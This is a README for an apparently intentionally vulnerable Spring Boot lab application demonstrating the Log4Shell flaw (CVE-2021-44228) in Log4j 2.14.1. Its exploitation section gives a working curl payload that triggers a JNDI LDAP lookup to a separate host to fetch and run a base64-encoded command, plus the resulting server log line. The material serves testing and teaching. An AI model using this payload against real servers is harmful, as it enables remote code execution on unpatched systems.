# Log4Shell vulnerable application (CVE-2021-44228)

This repository contains a Spring Boot web application vulnerable to CVE-2021-44228, known as [Log4Shell](https://www.lunasec.io/docs/blog/log4j-zero-day/).

It uses 
* Log4j 2.14.1 (through `spring-boot-starter-log4j2` 2.6.1) and
* JDK 1.8.0_181

## Running the application

[TODO]

## Exploitation steps

*Note: This is highly inspired from the original [LunaSec advisory](https://www.lunasec.io/docs/blog/log4j-zero-day/). **Run at your own risk, preferably in a VM in a sandbox environment**.*

* Trigger the exploit using:

```bash
# will execute 'touch /tmp/pwned'
curl 127.0.0.1:8080 -H 'user: ${jndi:ldap://192.168.1.4:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'
```

* Notice the warning in the server logs, that indicates that a JNDI lookup was tried:

```
2021-12-31 21:30:29,062 http-nio-8080-exec-1 WARN Error looking up JNDI resource [ldap://192.168.1.4:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=]. javax.naming.CommunicationException: 192.168.1.4:1389 [Root exception is java.net.ConnectException: Connection refused]
```

## Reference

https://www.lunasec.io/docs/blog/log4j-zero-day/
https://mbechler.github.io/2021/12/10/PSA_Log4Shell_JNDI_Injection/

